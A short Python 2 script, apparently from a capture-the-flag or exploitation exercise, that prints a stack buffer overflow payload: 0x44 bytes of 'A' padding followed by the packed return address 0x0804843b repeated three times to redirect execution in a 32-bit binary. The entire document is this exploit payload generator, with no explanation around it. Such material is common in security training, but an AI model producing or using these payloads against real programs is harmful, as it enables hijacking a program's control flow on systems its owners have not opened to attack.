#!/usr/bin/python
import struct

addr = struct.pack("<I", 0x0804843b)
print "A" * 0x44 + addr * 3
